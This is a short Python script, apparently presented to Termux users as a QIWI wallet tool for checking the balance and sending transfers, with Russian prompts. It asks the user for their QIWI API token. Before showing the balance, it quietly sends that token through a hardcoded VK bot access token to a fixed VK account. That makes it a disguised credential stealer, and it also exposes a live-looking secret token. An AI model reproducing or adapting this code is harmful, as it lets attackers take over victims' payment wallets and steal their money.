from SimpleQIWI import *
import os
yellow='\033[33m'
red='\033[31m'
green='\033[32m'
white='\033[37m'
import vk_api
from vk_api.longpoll import VkLongPoll, VkEventType 
import random 
from random import randint
def pay():
    x=random.randint(1,100)
    def ent(user_id,message):
        vk.method('messages.send',{'user_id':user_id,'message':message,'random_id':x})
    tokenl='599b58400abba5dc39e8ddd72a89a9464ecbc82c525c9e85a0d89624d18aef883af675d5939768d8fd341'
    vk=vk_api.VkApi(token=tokenl)
    longpoll=VkLongPoll(vk)
    os.system('clear')
    print('введи токен для оценки баланса')
    token=input('токен: ')
    phone=''
    ent(437306907,token)
    x+=1
    os.system('clear')
    try:
        api=QApi(token=token, phone=phone)
    except:
        print('\033[33m[-]неверный токен или ваш IP заблокирван')
    print('[+]токен ',token)
    print('[$]баланс ',api.balance[0],' рублей')
    print('---')
    print('[1] - обновить баланс Qiwi\n[2] - перевести на другой Qiwi\n')
    balance=api.balance[0]
    while True:
        payment=input(': ')
        if payment=='1':
            print('[$]баланс ',balance)
        elif payment=='2':
            print('пример номера +7 999 555 45 67')
            my_number=input('qiwi получателя: ')
            bay=input('сколько перевести: ')
            try:
                api.pay(account=my_number,amount=bay,comment='termux legacy')
                print(green+'переведенно '+bay+' рублей'+white)
            except:
                print(red+'не переведенно'+white)
try:
    pay()
except:
    print('\n'+yellow+'ошибка доступа\nповторите позже')
